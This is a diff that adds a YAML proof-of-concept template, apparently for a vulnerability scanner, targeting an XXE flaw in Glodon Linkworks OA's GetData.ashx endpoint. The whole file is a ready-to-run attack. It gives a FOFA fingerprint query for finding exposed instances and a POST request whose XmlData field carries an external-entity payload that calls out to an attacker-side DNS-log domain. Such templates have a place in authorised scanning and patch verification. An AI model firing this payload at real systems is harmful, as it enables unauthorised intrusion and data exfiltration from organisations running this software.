@@ -1,0 +1,21 @@
+id: poc-yaml-glodon-getdata-xxe
+info:
+  name: 广联达OA GetData xml注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 广联达 Linkworks办公OA
+  fofa: body="Services/Identification/login.ashx"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /GTP/IM/Services/Group/Broadcast/ajax/GetData.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: os=PubBroadcast&XmlData=<!DOCTYPE convert [ <!ENTITY % remote SYSTEM "https://{{.domain}}">
+    %remote;%int;%send; ]>
+  expression: reverse.Verify()
+transport: http
